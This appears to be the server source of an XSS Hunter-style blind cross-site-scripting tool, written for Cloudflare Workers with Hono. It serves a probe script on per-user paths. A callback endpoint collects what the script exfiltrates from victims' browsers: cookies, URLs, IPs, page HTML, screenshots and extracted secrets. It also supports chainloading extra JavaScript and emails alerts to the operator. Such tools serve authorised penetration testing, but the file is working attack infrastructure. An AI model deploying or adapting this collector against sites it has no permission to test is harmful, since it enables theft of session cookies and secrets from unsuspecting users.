import { Hono } from 'hono'
import { cors } from 'hono/cors'
import { sign, verify } from 'hono/jwt'
import { getCookie, setCookie, deleteCookie } from 'hono/cookie'
import Mustache from 'mustache'
import probeJs from './probe.txt'

type Bindings = {
  DB: D1Database
  SCREENSHOTS: R2Bucket
  JWT_SECRET: string
  XSS_HOSTNAME: string
  GOOGLE_CLIENT_ID: string
  GOOGLE_CLIENT_SECRET: string
  SENDGRID_API_KEY: string
  EMAIL_FROM: string
  EMAIL_NOTIFICATIONS_ENABLED: string
  SSL_CONTACT_EMAIL: string
  BLUR_SCREENSHOTS?: string
}

type Variables = {
  userId: string
  userEmail: string
}

const app = new Hono<{ Bindings: Bindings; Variables: Variables }>()

app.use('*', cors({
  origin: '*',
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowHeaders: ['Content-Type', 'X-CSRF-Buster', 'X-Requested-With'],
  credentials: true,
}))

function uuid(): string {
  return crypto.randomUUID()
}

function randomPath(length: number): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
  const array = new Uint8Array(length)
  crypto.getRandomValues(array)
  let r = ''
  for (let i = 0; i < length; i++) r += chars[array[i] % chars.length]
  return r
}

async function hashPw(password: string): Promise<string> {
  const enc = new TextEncoder()
  const salt = crypto.getRandomValues(new Uint8Array(16))
  const key = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveBits'])
  const bits = await crypto.subtle.deriveBits({ name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' }, key, 256)
  const s = Array.from(salt).map(b => b.toString(16).padStart(2, '0')).join('')
  const h = Array.from(new Uint8Array(bits)).map(b => b.toString(16).padStart(2, '0')).join('')
  return `pbkdf2:100000:${s}:${h}`
}

async function verifyPw(password: string, stored: string): Promise<boolean> {
  const parts = stored.split(':')
  if (parts[0] !== 'pbkdf2') return false
  const salt = new Uint8Array(parts[2].match(/.{2}/g)!.map(b => parseInt(b, 16)))
  const enc = new TextEncoder()
  const key = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveBits'])
  const bits = await crypto.subtle.deriveBits({ name: 'PBKDF2', salt, iterations: parseInt(parts[1]), hash: 'SHA-256' }, key, 256)
  const h = Array.from(new Uint8Array(bits)).map(b => b.toString(16).padStart(2, '0')).join('')
  return h === parts[3]
}

async function makeToken(c: any, userId: string): Promise<string> {
  return sign({ sub: userId, exp: Math.floor(Date.now() / 1000) + 604800 }, c.env.JWT_SECRET, 'HS256')
}

function cookieToken(c: any): string | undefined {
  return getCookie(c, 'session')
}

function bearerToken(c: any): string | undefined {
  const a = c.req.header('Authorization')
  if (a?.startsWith('Bearer ')) return a.slice(7)
}

async function requireAuth(c: any, next: any) {
  const token = cookieToken(c) || bearerToken(c)
  if (!token) {
    return c.json({ success: false, error: 'Not authenticated', code: 'NOT_AUTHENTICATED' }, 401)
  }
  try {
    const p = await verify(token, c.env.JWT_SECRET, 'HS256') as any
    c.set('userId', p.sub)
    await next()
  } catch {
    return c.json({ success: false, error: 'Invalid token', code: 'NOT_AUTHENTICATED' }, 401)
  }
}

async function csrfCheck(c: any, next: any) {
  if (!c.req.path.startsWith('/api/v1/')) return next()
  if (!c.req.header('X-CSRF-Buster')) {
    return c.json({ success: false, error: 'No CSRF header', code: 'CSRF_VIOLATION' }, 401)
  }
  await next()
}

app.use('/api/v1/*', csrfCheck)

// ---- HEALTH ----
app.get('/health', async (c) => {
  try {
    await c.env.DB.prepare('SELECT 1').run()
    return c.json({ status: 'ok' })
  } catch {
    return c.json({ status: 'error' }, 500)
  }
})

// ---- XSS PAYLOAD SERVING (catch-all - must be LAST) ----

// ---- JS CALLBACK (XSS payload fires) ----
app.post('/js_callback', async (c) => {
  const host = c.req.header('host')?.split(':')[0]
  if (host !== c.env.XSS_HOSTNAME) return c.json({ status: 'error' }, 403)

  const fd = await c.req.formData()
  const userPath = fd.get('path') as string
  if (!userPath) return c.json({ status: 'error' }, 400)

  const user = await c.env.DB.prepare('SELECT * FROM users WHERE path = ?').bind(userPath).first<any>()
  if (!user) return c.json({ status: 'error' }, 404)

  const pid = uuid()
  const sid = uuid()
  const encrypted = fd.has('encrypted_data')
  const ip = c.req.header('cf-connecting-ip') || c.req.header('x-forwarded-for') || ''

  // Handle screenshot -> R2 (raw, no gzip — CompressionStream unreliable in Workers)
  const ss = fd.get('screenshot') as File | null
  if (ss && ss.size > 0) {
    const ext = encrypted ? '.b64png.enc' : '.png'
    const key = `${sid}${ext}`
    const raw = new Uint8Array(await ss.arrayBuffer())
    await c.env.SCREENSHOTS.put(key, raw, {
      httpMetadata: { contentType: encrypted ? 'text/plain' : 'image/png' },
    })
  }

  if (encrypted) {
    const ed = fd.get('encrypted_data') as string
    const pk = fd.get('pgp_key') as string
    if ((ed?.length || 0) > 100000 || (pk?.length || 0) > 100000) {
      return c.json({ status: 'error', message: 'data too long' }, 400)
    }
    await c.env.DB.prepare(
      `INSERT INTO payload_fire_results (id,user_id,encrypted,encrypted_data,public_key,screenshot_id)
       VALUES (?,?,1,?,?,?)`
    ).bind(pid, user.id, ed, pk, sid).run()
  } else {
    const corsVal = fd.get('CORS') as string
    const gitVal = fd.get('gitExposed') as string
    let secrets: any[] = []
    try { secrets = JSON.parse((fd.get('secrets') as string) || '[]') } catch {}

    await c.env.DB.prepare(
      `INSERT INTO payload_fire_results
       (id,user_id,encrypted,url,ip_address,referer,user_agent,cookies,title,origin,screenshot_id,was_iframe,browser_timestamp,git_exposed,cors)
       VALUES (?,?,0,?,?,?,?,?,?,?,?,?,?,?,?)`
    ).bind(
      pid, user.id,
      fd.get('uri') as string || '',
      ip,
      fd.get('referrer') as string || '',
      fd.get('user-agent') as string || '',
      fd.get('cookies') as string || '',
      fd.get('title') as string || '',
      fd.get('origin') as string || '',
      sid,
      fd.get('was_iframe') === 'true' ? 1 : 0,
      parseInt(fd.get('browser-time') as string) || 0,
      gitVal && gitVal !== 'false' ? gitVal.substring(0, 5000) : null,
      corsVal && corsVal !== 'false' ? corsVal : null,
    ).run()

    for (const s of secrets) {
      await c.env.DB.prepare(
        'INSERT INTO secrets (id,payload_id,secret_type,secret_value) VALUES (?,?,?,?)'
      ).bind(uuid(), pid, s.secret_type || '', s.secret_value || '').run()
    }
  }

  // Correlate injection
  const injKey = fd.get('injection_key') as string
  if (injKey) {
    const corr = await c.env.DB.prepare(
      'SELECT request FROM injection_requests WHERE injection_key = ?'
    ).bind(injKey).first<any>()
  }

  // Email notification
  if (user.send_email_alerts && c.env.EMAIL_NOTIFICATIONS_ENABLED === 'true') {
    c.executionCtx.waitUntil(sendAlert(c, user, pid, sid, encrypted, fd))
  }

  return c.json({ status: 'success' })
})

// ---- PAGE CALLBACK ----
app.post('/page_callback', async (c) => {
  const fd = await c.req.formData()
  await c.env.DB.prepare(
    'INSERT INTO collected_pages (id, uri, html) VALUES (?, ?, ?)'
  ).bind(uuid(), fd.get('uri') as string || '', fd.get('html') as string || '').run()
  return c.json({ status: 'success' })
})

// ---- SCREENSHOTS ----
const RE_PNG = /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i
const RE_ENC = /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.b64png\.enc$/i

app.get('/screenshots/:filename', async (c) => {
  const fn = c.req.param('filename')
  const isEnc = RE_ENC.test(fn)
  if (!RE_PNG.test(fn) && !isEnc) return c.text('Not Found', 404)

  const obj = await c.env.SCREENSHOTS.get(fn)
  if (!obj) return c.text('Not Found', 404)

  const h = new Headers()
  if (isEnc) {
    h.set('Content-Type', 'text/plain')
    h.set('Content-Disposition', 'attachment; filename=screenshot.b64png.enc')
  } else {
    h.set('Content-Type', 'image/png')
  }
  h.set('Cache-Control', 'public, max-age=86400')
  return new Response(obj.body, { headers: h })
})

// ---- GOOGLE OAUTH ----
app.get('/login', (c) => {
  const redirect = `https://${c.env.XSS_HOSTNAME}/oauth-login`
  const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${c.env.GOOGLE_CLIENT_ID}&redirect_uri=${encodeURIComponent(redirect)}&response_type=code&scope=email%20profile&access_type=offline&prompt=select_account`
  return c.redirect(url)
})

app.get('/oauth-login', async (c) => {
  const code = c.req.query('code')
  if (!code) return c.text('No code', 400)

  const redirect = `https://${c.env.XSS_HOSTNAME}/oauth-login`
  const tok = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      code, client_id: c.env.GOOGLE_CLIENT_ID,
      client_secret: c.env.GOOGLE_CLIENT_SECRET,
      redirect_uri: redirect, grant_type: 'authorization_code',
    }),
  })
  if (!tok.ok) return c.text('OAuth failed', 400)
  const tokens: any = await tok.json()

  const prof = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
    headers: { Authorization: `Bearer ${tokens.access_token}` },
  })
  const profile: any = await prof.json()
  const email = profile.email

  let user = await c.env.DB.prepare('SELECT * FROM users WHERE email = ?').bind(email).first<any>()
  if (!user) {
    const id = uuid()
    const p = randomPath(10)
    const ak = randomPath(20)
    await c.env.DB.prepare(
      'INSERT INTO users (id,email,path,injection_correlation_api_key) VALUES (?,?,?,?)'
    ).bind(id, email, p, ak).run()
    user = { id, email, path: p }
  }

  const token = await makeToken(c, user.id)
  setCookie(c, 'session', token, {
    path: '/', httpOnly: true, secure: true, sameSite: 'Lax', maxAge: 604800,
  })
  return c.redirect('/app/')
})

// ---- AUTH CHECK ----
app.get('/api/v1/auth-check', async (c) => {
  const token = cookieToken(c) || bearerToken(c)
  if (!token) return c.json({ success: true, result: { is_authenticated: false } })
  try {
    await verify(token, c.env.JWT_SECRET, 'HS256')
    return c.json({ success: true, result: { is_authenticated: true } })
  } catch {
    return c.json({ success: true, result: { is_authenticated: false } })
  }
})

// ---- XSS URI ----
app.get('/api/v1/xss-uri', requireAuth, async (c) => {
  const u = await c.env.DB.prepare('SELECT path FROM users WHERE id = ?').bind(c.get('userId')).first<any>()
  return c.json({ success: true, result: { uri: `${c.env.XSS_HOSTNAME}/${u.path}` } })
})

// ---- USER PATH ----
app.get('/api/v1/user-path', requireAuth, async (c) => {
  const u = await c.env.DB.prepare('SELECT path FROM users WHERE id = ?').bind(c.get('userId')).first<any>()
  return c.json({ success: true, result: { path: u.path } })
})

app.put('/api/v1/user-path', requireAuth, async (c) => {
  const body = await c.req.json()
  if (typeof body.user_path !== 'string') return c.json({ success: false, error: 'invalid path' })
  const uid = c.get('userId')
  const coll = await c.env.DB.prepare('SELECT id FROM users WHERE path = ? AND id != ?').bind(body.user_path, uid).first()
  if (coll) return c.json({ success: false, error: 'Path taken' })
  await c.env.DB.prepare("UPDATE users SET path = ?, updated_at = datetime('now') WHERE id = ?").bind(body.user_path, uid).run()
  return c.json({ success: true, result: { path: body.user_path } })
})

// ---- PAYLOAD FIRES ----
app.get('/api/v1/payloadfires', requireAuth, async (c) => {
  const uid = c.get('userId')
  const page = Math.max(1, parseInt(c.req.query('page') || '1'))
  const limit = Math.max(1, Math.min(100, parseInt(c.req.query('limit') || '10')))
  const offset = (page - 1) * limit

  const { count } = await c.env.DB.prepare(
    'SELECT COUNT(*) as count FROM payload_fire_results WHERE user_id = ?'
  ).bind(uid).first<any>()

  const { results } = await c.env.DB.prepare(
    'SELECT * FROM payload_fire_results WHERE user_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?'
  ).bind(uid, limit, offset).all<any>()

  const payloads = []
  for (const r of results) {
    const { results: sec } = await c.env.DB.prepare(
      'SELECT * FROM secrets WHERE payload_id = ?'
    ).bind(r.id).all<any>()
    payloads.push({
      id: r.id,
      url: r.url,
      ip_address: r.ip_address,
      referer: r.referer,
      user_agent: r.user_agent,
      cookies: r.cookies,
      title: r.title,
      origin: r.origin,
      screenshot_id: r.screenshot_id,
      was_iframe: r.was_iframe,
      browser_timestamp: r.browser_timestamp,
      CORS: r.cors,
      gitExposed: r.git_exposed,
      createdAt: r.created_at,
      encrypted: r.encrypted,
      encrypted_data: r.encrypted_data,
      public_key: r.public_key,
      updatedAt: r.updated_at,
      secrets: sec,
    })
  }
  return c.json({ success: true, result: { payload_fires: payloads, total: count } })
})

app.delete('/api/v1/payloadfires', requireAuth, async (c) => {
  const body = await c.req.json()
  const ids: string[] = body.ids || []
  if (!ids.length) return c.json({ success: true, result: {} })
  const uid = c.get('userId')

  const ph = ids.map(() => '?').join(',')
  const rows = await c.env.DB.prepare(
    `SELECT id, screenshot_id, encrypted FROM payload_fire_results WHERE id IN (${ph}) AND user_id = ?`
  ).bind(...ids, uid).all<any>()

  for (const r of rows.results) {
    const ext = r.encrypted ? '.b64png.enc.gz' : '.png.gz'
    await c.env.SCREENSHOTS.delete(`${r.screenshot_id}${ext}`)
  }

  await c.env.DB.prepare(`DELETE FROM secrets WHERE payload_id IN (${ph})`).bind(...ids).run()
  await c.env.DB.prepare(`DELETE FROM payload_fire_results WHERE id IN (${ph}) AND user_id = ?`).bind(...ids, uid).run()
  return c.json({ success: true, result: {} })
})

// ---- COLLECTED PAGES ----
app.get('/api/v1/collected_pages', requireAuth, async (c) => {
  const uid = c.get('userId')
  const page = Math.max(1, parseInt(c.req.query('page') || '1'))
  const limit = Math.max(1, Math.min(100, parseInt(c.req.query('limit') || '10')))
  const offset = (page - 1) * limit

  const { count } = await c.env.DB.prepare(
    'SELECT COUNT(*) as count FROM collected_pages WHERE user_id = ?'
  ).bind(uid).first<any>()

  const { results } = await c.env.DB.prepare(
    'SELECT * FROM collected_pages WHERE user_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?'
  ).bind(uid, limit, offset).all<any>()

  return c.json({ success: true, result: { collected_pages: results, total: count } })
})

app.delete('/api/v1/collected_pages', requireAuth, async (c) => {
  const body = await c.req.json()
  const ids: string[] = body.ids || []
  if (!ids.length) return c.json({ success: true, result: {} })
  const uid = c.get('userId')
  const ph = ids.map(() => '?').join(',')
  await c.env.DB.prepare(`DELETE FROM collected_pages WHERE id IN (${ph}) AND user_id = ?`).bind(...ids, uid).run()
  return c.json({ success: true, result: {} })
})

// ---- RECORD INJECTION ----
app.post('/api/v1/record_injection', async (c) => {
  const body = await c.req.json()
  const user = await c.env.DB.prepare(
    'SELECT id FROM users WHERE injection_correlation_api_key = ?'
  ).bind(body.owner_correlation_key).first<any>()
  if (!user) return c.json({ success: false, error: 'Invalid auth', code: 'INVALID_CREDENTIALS' })

  try {
    await c.env.DB.prepare(
      'INSERT INTO injection_requests (id, request, injection_key) VALUES (?, ?, ?)'
    ).bind(uuid(), body.request, body.injection_key).run()
    return c.json({ success: true, message: 'Injection request recorded!' })
  } catch (e: any) {
    if (e.message?.includes('UNIQUE')) {
      return c.json({ success: false, error: 'Key already used', code: 'EXISTING_INJECTION_KEY' })
    }
    throw e
  }
})

// ---- SETTINGS ----
app.get('/api/v1/settings', requireAuth, async (c) => {
  const u = await c.env.DB.prepare(
    'SELECT injection_correlation_api_key, additional_js, pgp_key, send_email_alerts FROM users WHERE id = ?'
  ).bind(c.get('userId')).first<any>()
  if (!u) return c.text('Invalid', 400)
  return c.json({
    success: true,
    result: {
      correlation_api_key: u.injection_correlation_api_key,
      chainload_uri: u.additional_js,
      pgp_key: u.pgp_key,
      send_alert_emails: !!u.send_email_alerts,
    },
  })
})

app.put('/api/v1/settings', requireAuth, async (c) => {
  const body = await c.req.json()
  const uid = c.get('userId')
  const u = await c.env.DB.prepare('SELECT id FROM users WHERE id = ?').bind(uid).first()
  if (!u) return c.text('Invalid', 400)

  if (body.correlation_api_key === true) {
    await c.env.DB.prepare(
      "UPDATE users SET injection_correlation_api_key = ?, updated_at = datetime('now') WHERE id = ?"
    ).bind(randomPath(20), uid).run()
  }
  if (body.chainload_uri !== undefined) {
    await c.env.DB.prepare(
      "UPDATE users SET additional_js = ?, updated_at = datetime('now') WHERE id = ?"
    ).bind(body.chainload_uri === '' ? null : body.chainload_uri, uid).run()
  }
  if (body.pgp_key !== undefined) {
    await c.env.DB.prepare(
      "UPDATE users SET pgp_key = ?, updated_at = datetime('now') WHERE id = ?"
    ).bind(body.pgp_key === '' ? null : body.pgp_key, uid).run()
  }
  if (body.send_alert_emails !== undefined) {
    await c.env.DB.prepare(
      "UPDATE users SET send_email_alerts = ?, updated_at = datetime('now') WHERE id = ?"
    ).bind(body.send_alert_emails ? 1 : 0, uid).run()
  }
  return c.json({ success: true, result: {} })
})

// ---- FRONTEND STATIC (if built) ----
const MIME: Record<string, string> = {
  html: 'text/html', js: 'application/javascript', css: 'text/css',
  json: 'application/json', png: 'image/png', jpg: 'image/jpeg',
  jpeg: 'image/jpeg', gif: 'image/gif', svg: 'image/svg+xml',
  ico: 'image/x-icon', woff: 'font/woff', woff2: 'font/woff2',
  ttf: 'font/ttf', eot: 'application/vnd.ms-fontobject',
  map: 'application/json', webmanifest: 'application/manifest+json',
}

app.get('/app/*', async (c) => {
  let p = c.req.path.replace('/app/', '') || ''
  if (!p || p.endsWith('/')) p += 'index.html'

  const hasExt = p.includes('.')
  const obj = await c.env.SCREENSHOTS.get(`frontend/${p}`)
  if (obj) {
    const ext = p.split('.').pop() || ''
    return new Response(obj.body, {
      headers: {
        'Content-Type': MIME[ext] || 'application/octet-stream',
        'Cache-Control': 'public, max-age=31536000',
      },
    })
  }
  // SPA fallback only for routes without file extensions
  if (!hasExt) {
    const idx = await c.env.SCREENSHOTS.get('frontend/index.html')
    if (idx) return new Response(idx.body, { headers: { 'Content-Type': 'text/html' } })
  }
  return c.text('Not Found', 404)
})

// ---- EMAIL NOTIFICATION HELPER ----
async function sendAlert(c: any, user: any, pid: string, sid: string, encrypted: boolean, fd: FormData) {
  const host = `https://${c.env.XSS_HOSTNAME}`
  const screenshotUrl = `${host}/screenshots/${sid}.png`
  const fireLocation = encrypted ? 'With An Encryption Key' : (fd.get('uri') as string || 'unknown')

  // Fetch the payload and correlation data from DB
  const pf = await c.env.DB.prepare('SELECT * FROM payload_fire_results WHERE id = ?').bind(pid).first<any>()
  if (!pf) return

  let correlatedReq = 'No correlated request found for this injection.'
  const injKey = fd.get('injection_key') as string
  if (injKey) {
    const corr = await c.env.DB.prepare(
      'SELECT request FROM injection_requests WHERE injection_key = ?'
    ).bind(injKey).first<any>()
    if (corr) correlatedReq = corr.request
  }

  const view = {
    xsshunter_url: host,
    screenshot_url: screenshotUrl,
    browser_timestamp: pf.browser_timestamp || '',
    encrypted: encrypted,
    encrypted_data: pf.encrypted_data || '',
    public_key: pf.public_key || '',
    url: pf.url || '',
    ip_address: pf.ip_address || '',
    referer: pf.referer || '',
    user_agent: pf.user_agent || '',
    origin: pf.origin || '',
    correlated_request: correlatedReq,
  }

  const tmpl = `<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body style="font-family:sans-serif">
<h1>XSSHunter Report</h1>
<p>Report from <a href="{{xsshunter_url}}">{{xsshunter_url}}</a>.</p>
<hr>
{{#encrypted}}
<div><h3>PGP Encrypted Data</h3><pre>{{encrypted_data}}</pre></div>
<div><h3>Public Key</h3><pre>{{public_key}}</pre></div>
{{/encrypted}}
{{^encrypted}}
<div><h3>URL</h3><a href="{{url}}">{{url}}</a></div>
<div><h3>IP</h3>{{ip_address}}</div>
<div><h3>Referer</h3><a href="{{referer}}">{{referer}}</a></div>
<div><h3>User-Agent</h3><code>{{user_agent}}</code></div>
<div><h3>Origin</h3><pre>{{origin}}</pre></div>
<div><h3>Correlated Request</h3><pre>{{correlated_request}}</pre></div>
{{/encrypted}}
<hr>
<img src="{{screenshot_url}}" />
</body></html>`

  const html = Mustache.render(tmpl, view)

  try {
    await fetch('https://api.sendgrid.com/v3/mail/send', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${c.env.SENDGRID_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        personalizations: [{ to: [{ email: user.email }] }],
        from: { email: c.env.EMAIL_FROM },
        subject: `[XSS Hunter Express] XSS Payload Fired On ${fireLocation}`,
        content: [{ type: 'text/html', value: html }],
      }),
    })
  } catch (e) {
    console.error('Email send failed:', e)
  }
}

// ---- XSS PAYLOAD (must be after all static routes) ----
app.get('/', (c) => c.redirect(`/${uuid()}`))

app.get('/:probe_id', async (c) => {
  const probeId = c.req.param('probe_id')
  const host = c.req.header('host')?.split(':')[0]
  if (host !== c.env.XSS_HOSTNAME) return c.redirect('/app/')

  const user = await c.env.DB.prepare('SELECT * FROM users WHERE path = ?').bind(probeId).first<any>()
  if (!user) return c.text('Hey')

  const xssHost = `https://${c.env.XSS_HOSTNAME}`
  const pgpKey = user.pgp_key || ''
  const chainload = user.additional_js || ''

  const blurScreenshots = c.env.BLUR_SCREENSHOTS === 'true'

  const content = probeJs
    .replace(/\[HOST_URL\]/g, xssHost)
    .replace(/\[USER_PATH\]/g, user.path)
    .replace('[COLLECT_PAGE_LIST_REPLACE_ME]', JSON.stringify([]))
    .replace('[pgp_key]', pgpKey)
    .replace('[CHAINLOAD_REPLACE_ME]', JSON.stringify(chainload))
    .replace('[PROBE_ID]', JSON.stringify(probeId))
    .replace('[BLUR_SCREENSHOTS]', JSON.stringify(blurScreenshots))

  return new Response(content, {
    headers: {
      'Content-Type': 'application/javascript',
      'Content-Security-Policy': "default-src 'none'; script-src 'none'",
      'Access-Control-Allow-Origin': '*',
    },
  })
})

export default app
